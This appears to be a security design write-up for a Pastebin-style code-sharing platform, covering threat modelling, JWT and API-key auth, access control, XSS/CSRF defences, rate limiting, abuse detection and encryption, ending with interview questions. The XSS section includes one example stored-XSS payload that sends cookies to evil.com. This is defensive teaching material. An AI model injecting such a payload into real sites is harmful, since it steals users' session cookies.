# 08 — Security Design: Pastebin / Code Sharing Platform

---

## Objective

Design a comprehensive security posture for the Pastebin platform. Cover authentication, authorization, data protection, content security, abuse prevention, and compliance. Think like an attacker and a defender simultaneously.

---

## Threat Model

| Threat | Impact | Likelihood |
|--------|--------|-----------|
| Unauthorized access to private pastes | High | Medium |
| Brute-force short key enumeration | Medium | High |
| Malware/phishing content distribution | High | High |
| SQL injection via content or search | High | Low (parameterized) |
| XSS via syntax-highlighted content | High | Medium |
| API key theft | High | Medium |
| Rate limit bypass (paste spam) | Medium | High |
| DDoS on paste creation endpoint | High | Medium |
| Credential stuffing on login | High | Medium |

---

## Authentication

### JWT Design

**Token structure:**
```json
Header: { "alg": "RS256", "typ": "JWT", "kid": "key-2026-05" }
Payload: {
  "sub": "usr_abc123",
  "email": "user@example.com",
  "roles": ["user"],
  "iat": 1716000000,
  "exp": 1716003600,
  "jti": "jwt_unique_id"
}
```

**Why RS256 instead of HS256?**
- RS256 uses asymmetric keys: private key signs, public key verifies
- Public key can be distributed to downstream services for local verification
- Even if one service is compromised, the private key (held only by Identity service) is safe
- HS256 symmetric key must be shared with all services — risk of key exposure

**Token lifetimes:**
- Access token: 1 hour (short-lived, minimize stolen token window)
- Refresh token: 30 days (httpOnly secure cookie, not accessible to JS)
- Refresh token rotation: new refresh token issued on each use (sliding window)

**Token revocation:**
- Access token: not revocable (stateless JWT — accept within lifetime)
- Refresh token: revocable via `jti` stored in Redis with TTL = 30 days
- On logout: revoke refresh token; access token expires naturally

**Why not stateful sessions?**
- Pastes are served from multiple regions; session state would require sticky sessions or distributed session store
- JWT allows stateless verification at CDN edge (future: Cloudflare Workers verify JWTs)

### API Key Authentication

API keys for programmatic access:

**Key format:** `pb_live_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6`
- Prefix: `pb_live_` (environment identifier)
- Suffix: 32 cryptographically random characters (256 bits of entropy)

**Storage:**
- Raw key shown only once (at creation) — not stored
- Stored as: `SHA-256(rawKey)` in `identity.api_keys.key_hash`
- Prefix stored separately for display: `a1b2c3d4` (first 8 chars)

**Verification flow:**
```
1. Extract key from X-Api-Key header
2. Compute SHA-256(key)
3. SELECT * FROM api_keys WHERE key_hash = ? AND is_active = TRUE
4. If found: authenticate request as key's owner
5. If not found: 401 Unauthorized
```

**Redis caching for API key lookup:**
- `api_key:{hash} → userId` with TTL 5 minutes
- Avoids DB hit on every API request
- On key revocation: invalidate Redis entry immediately

---

## Authorization (Access Control)

### Paste Access Decision Matrix

| Paste Type | Auth Required | Additional Check |
|-----------|--------------|-----------------|
| PUBLIC | No | None |
| UNLISTED | No | Must have exact short key |
| PRIVATE | Yes (owner only) | JWT sub must match paste owner_id |
| Password-protected PUBLIC | No | Must provide correct password |
| Password-protected PRIVATE | Yes + Password | JWT sub match + password |

### Access Decision Service

```
PasteAccessControlService.canAccess(paste, requester):

1. Is paste deleted? → 404
2. Is paste expired? → 410
3. Is paste abuse-flagged? → 403
4. If PRIVATE:
   - Is requester authenticated? → 401 if not
   - Is requester the owner? → 403 if not
5. If password-protected:
   - Is password provided? → 402 "password required" if not
   - Is password correct (bcrypt verify)? → 403 if wrong
6. Allow access
```

**Why bcrypt for paste password (not SHA-256)?**
- Bcrypt is slow by design — resists brute-force
- Paste passwords are user-chosen and may be weak
- SHA-256 would allow rainbow table attacks on common passwords
- bcrypt cost factor: 12 (adjust based on server hardware)

### RBAC (Role-Based Access Control)

| Role | Capabilities |
|------|-------------|
| anonymous | Create public/unlisted pastes, view public/unlisted pastes |
| user | + Create private pastes, manage own pastes, API keys |
| moderator | + View flagged pastes, resolve abuse reports |
| admin | + Manage users, view all pastes regardless of access level |

Roles are embedded in JWT claims. Spring Security `@PreAuthorize` enforces at method level.

---

## Content Security

### XSS Prevention

Pastebin renders code with syntax highlighting — a classic XSS vector.

**Dangerous scenario:**
```html
<!-- User pastes this as "HTML" content -->
<script>document.location='https://evil.com?c='+document.cookie</script>
```

If the application renders this in the page without escaping → stored XSS.

**Mitigations:**

1. **Server-side HTML escaping**: All paste content rendered via Thymeleaf/React must escape HTML entities. `<` becomes `&lt;`, `>` becomes `&gt;`

2. **Content Security Policy (CSP) header:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
```
CSP blocks inline scripts even if XSS injection occurs.

3. **Separate domain for raw content:**
- Paste content served from `raw.pastebin.io` (not `pastebin.io`)
- Cookies from `pastebin.io` are not sent to `raw.pastebin.io`
- Even if XSS is possible in raw content, it cannot steal session cookies

4. **Client-side syntax highlighting only:**
- Server never executes paste content
- PrismJS / Highlight.js runs in browser with escaped HTML input

### CSRF Protection

- API endpoints: JWT Bearer token in Authorization header — inherently CSRF-safe (browser cannot auto-send custom headers)
- Cookie-based sessions: CSRF token required (double-submit cookie pattern)
- `SameSite=Lax` cookie attribute for session cookies

### SQL Injection Prevention

- Spring Data JPA / Hibernate: parameterized queries by default
- Native queries: use `@Query` with `?1` positional parameters — never string concatenation
- Custom alias validation: `^[a-zA-Z0-9-]{4,32}$` regex — only safe characters

---

## Rate Limiting and Abuse Prevention

### Paste Creation Rate Limits

```
Anonymous users:
  - 10 pastes per hour per IP
  - 50 pastes per day per IP
  - Max 100 KB per paste (anonymous tier)

Authenticated users:
  - 100 pastes per day
  - Max 10 MB per paste

API key users:
  - Configurable per key (default: 1,000/day)
  - Burst: 50/minute
```

### Anonymous Paste Spam Prevention

Anonymous users are the highest spam risk. Additional mitigations:

1. **CAPTCHA challenge** after 3 paste creations in 10 minutes from same IP
2. **Disposable email detection** — flag signups from known temp email providers
3. **Content fingerprinting** — identical content from same IP within 1 hour → reject
4. **IP reputation** — integrate with AbuseIPDB or Cloudflare threat intelligence
5. **Honeypot field** — hidden form field; if submitted, bot detected

### Content Abuse Detection

**Layer 1 — Hash blocklist (sync, per request):**
- Maintain MD5/SHA-256 blocklist of known CSAM and malware
- Check on every paste creation: O(1) Redis lookup
- Zero false positives — exact hash match only

**Layer 2 — Pattern matching (async, within seconds):**
- Known phishing URLs, malware signatures, spam patterns
- Regex engine applied to content async after creation
- Paste accessible immediately; taken down if pattern matches

**Layer 3 — ML classifier (async, within minutes):**
- Toxicity, NSFW, credential dump detection
- Probabilistic — confidence threshold for automated action
- Low-confidence flags routed to human moderation queue

**DMCA Takedown:**
- Dedicated endpoint for copyright holders: `POST /dmca`
- Manual review by ops team
- Compliant removal within 24 hours

---

## Encryption

### Data in Transit
- TLS 1.2+ everywhere (application, Kafka, Redis, PostgreSQL replication)
- HSTS header: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- TLS 1.0/1.1 disabled
- Cipher suite: prefer ECDHE for perfect forward secrecy

### Data at Rest
- S3: Server-Side Encryption (SSE-KMS) with customer-managed key per environment
- PostgreSQL: filesystem encryption via OS (AWS EBS encryption)
- Redis: no sensitive data stored in Redis; if passwords cached, use Redis AUTH + TLS
- Database backups: encrypted with separate KMS key

### Key Management
- AWS KMS for key management (never hardcode keys)
- Key rotation: annual for S3 encryption keys
- API keys: stored as SHA-256 hash — raw key never at rest
- JWT signing: RSA private key in AWS Secrets Manager, rotated annually
- Database password: AWS Secrets Manager, rotated every 90 days

---

## Secrets Management

```
Never in:
  - Git repository (no secrets in code or config files)
  - Environment variables on developer machines (risk of shell history leak)
  - Application logs

Always in:
  - AWS Secrets Manager (production)
  - HashiCorp Vault (self-hosted alternative)
  - Kubernetes Secrets (mounted as volumes, not env vars if possible)

Spring Boot integration:
  - spring-cloud-aws-secrets-manager
  - Secrets injected at startup
  - Hot rotation without app restart via Spring Cloud Config
```

---

## Audit Logging

All security-sensitive operations must be audit-logged:

| Event | Data Logged |
|-------|------------|
| User login (success/fail) | timestamp, userId/email, IP, user-agent |
| API key created/revoked | timestamp, userId, keyPrefix |
| Paste created | timestamp, userId, shortKey, accessLevel, size |
| Paste deleted | timestamp, userId, shortKey, reason |
| Private paste accessed | timestamp, userId, shortKey |
| Password-protected paste accessed | timestamp, shortKey, IP |
| Abuse report filed | timestamp, reporterId, shortKey, reason |
| Admin access to any paste | timestamp, adminId, shortKey |

Audit logs:
- Written to dedicated append-only Kafka topic (`audit.events`)
- Consumed by audit log service → write to S3 (Glacier for long-term)
- Never deleted (7-year retention for compliance)
- Not stored in the same DB as application data

---

## Security Headers

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Content-Security-Policy: [as above]
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

---

## Interview Discussion Points

- Why use RS256 for JWT instead of HS256?
- What is the risk of rendering syntax-highlighted code server-side without a separate domain for raw content?
- How does bcrypt protect paste passwords that users might choose weakly (like "hello")?
- What is the CSRF attack scenario, and why does JWT in Authorization header prevent it?
- How do you handle DMCA takedowns for anonymous pastes (no owner to notify)?
- What data should NEVER appear in application logs? (Raw passwords, raw API keys, PII)
- If an attacker knows the short_key format (Base62, 6 chars), what prevents them from brute-forcing all paste keys?
